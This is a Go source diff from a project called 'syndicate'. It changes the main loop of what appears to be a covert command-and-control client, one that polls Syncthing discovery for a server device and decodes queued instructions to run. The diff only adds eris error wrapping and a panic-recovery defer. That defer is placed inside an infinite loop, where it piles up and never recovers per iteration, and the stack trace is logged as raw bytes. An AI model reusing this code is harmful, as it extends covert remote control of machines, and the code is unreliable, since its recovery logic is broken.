@@ -5,9 +5,9 @@ import (
 	"crypto/tls"
 	_ "embed"
 	"encoding/binary"
-	"errors"
 	"log"
 	"net/url"
+	"runtime/debug"
 	"slices"
 	"time"
 
@@ -15,6 +15,7 @@ import (
 	"gitlab.torproject.org/acheong08/syndicate/lib/commands"
 	"gitlab.torproject.org/acheong08/syndicate/lib/utils"
 
+	"github.com/rotisserie/eris"
 	"github.com/syncthing/syncthing/lib/protocol"
 )
 
@@ -52,6 +53,12 @@ func main() {
 	var insID []uint32
 	jobs := make(map[commands.Command]context.CancelFunc)
 	for {
+		defer func() {
+			err := recover()
+			if err != nil {
+				log.Println("stack trace from panic", debug.Stack())
+			}
+		}()
 		err := func() error {
 			ctx, cancel := context.WithTimeout(context.Background(), timeout)
 			defer cancel()
@@ -61,18 +68,18 @@ func main() {
 			}
 			addresses, err := syncthing.Lookup(serverDeviceID)
 			if err != nil {
-				return err
+				return eris.Wrap(err, "syncthing lookup failed")
 			}
 			relayAddress := addresses[0]
 			var data []byte = nil
 			for _, address := range addresses[1:] {
 				tmpData, err := utils.DecodeURLs([]url.URL{address}, clientDeviceID)
 				if err != nil {
-					return err
+					return eris.Wrapf(err, "could not decode URL %s", address.String())
 				}
 
 				if len(tmpData) < 5 {
-					return errors.New("recieved insufficient data")
+					return eris.New("recieved insufficient data")
 				}
 				// Check if the instruction ID is already processed
 				commandID := binary.BigEndian.Uint32(tmpData[1:5])
@@ -85,7 +92,8 @@ func main() {
 				break
 			}
 			if data == nil {
-				return errors.New("all instructions already processed")
+				log.Println("All instructions already processed")
+				return nil
 			}
 			command := commands.Command(data[0])
 
@@ -110,7 +118,7 @@ func main() {
 			return nil
 		}()
 		if err != nil {
-			log.Println(err)
+			log.Println(eris.ToString(err, true))
 		}
 		time.Sleep(time.Second * 10)
 		continue
